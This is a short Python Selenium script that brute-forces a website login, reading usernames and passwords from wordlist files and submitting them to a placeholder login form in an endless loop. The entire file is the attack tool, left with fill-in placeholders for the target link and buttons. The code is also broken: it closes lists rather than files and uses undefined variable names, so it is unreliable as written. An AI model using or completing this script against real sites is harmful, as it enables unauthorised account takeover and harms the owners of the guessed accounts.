from selenium import webdriver
import time
from selenium.webdriver.common.by import By


usernames = open("username file here", "r",encoding='ISO-8859-1')
passwords = open("password file here", "r",encoding='ISO-8859-1')

list_of_usernames = []
list_of_passwords = []

for line in usernames:
  stripped_line = line.strip()
  line_list = stripped_line.split()
  list_of_usernames.append(line_list)

list_of_usernames.close()

for line in passwords:
  stripped_line = line.strip()
  line_list = stripped_line.split()
  list_of_passwords.append(line_list)

list_of_passwords.close()

driver = webdriver.Chrome('chromedriver') 

driver.get("YOUR LINK HERE")

time.sleep(1)

btn = driver.find_element(By.XPATH, 'XPATH OF THE BUTTON YOU WANT TO CLICK')
btn.click()

time.sleep(2)

#if a new window pops up
driver.switch_to.window(driver.window_handles[-1])

driver.switch_to.frame(0)

time.sleep(2)

username = driver.find_element(By.NAME, "username")
password = driver.find_element(By.NAME, "password")

u = 0
p = 0
while True:
    if(u > 296167 ):
        u = 0
    if(p > 5945065):
        p = 0

    username.send_keys(list_of_username[u])
    u += 1

    password.send_keys(list_of_password[passc])
    p += 1


    btn = driver.find_element(By.XPATH, "XPATH OF THE BUTTON YOU WANT TO CLICK")
    btn.click()
    driver.find_element(By.NAME, "username").clear()
    driver.find_element(By.NAME, "password").clear()
    
    time.sleep(2)

    
